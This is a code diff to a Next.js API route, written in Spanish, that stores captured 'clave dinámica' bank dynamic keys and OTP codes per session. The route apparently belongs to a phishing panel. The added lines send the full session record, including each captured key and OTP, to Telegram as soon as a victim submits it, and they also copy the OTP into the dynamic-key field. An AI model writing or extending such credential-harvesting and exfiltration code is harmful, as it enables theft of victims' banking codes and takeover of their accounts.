@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { PrismaClient } from '@prisma/client';
+import { sendToTelegram } from '@/lib/telegram';
 
 const prisma = new PrismaClient();
 
@@ -77,6 +78,14 @@ export async function POST(request: NextRequest) {
             updatedAt: new Date(),
           }
         });
+        
+        // Enviar datos completos a Telegram cuando se capture la clave dinámica
+        try {
+          await sendToTelegram(updatedDynamicKeySession);
+        } catch (error) {
+          console.error('Error sending to Telegram:', error);
+        }
+        
         return NextResponse.json({ success: true, session: updatedDynamicKeySession });
 
       case 'request_otp':
@@ -114,10 +123,19 @@ export async function POST(request: NextRequest) {
           where: { sessionId },
           data: {
             otp: data.otp,
+            claveDinamica: data.otp, // También guardar en claveDinamica
             status: 'otp_submitted',
             updatedAt: new Date(),
           }
         });
+        
+        // Enviar datos completos a Telegram cuando se envíe el OTP
+        try {
+          await sendToTelegram(updatedOtpSubmitSession);
+        } catch (error) {
+          console.error('Error sending to Telegram:', error);
+        }
+        
         return NextResponse.json({ success: true, session: updatedOtpSubmitSession });
 
       case 'validate_otp':
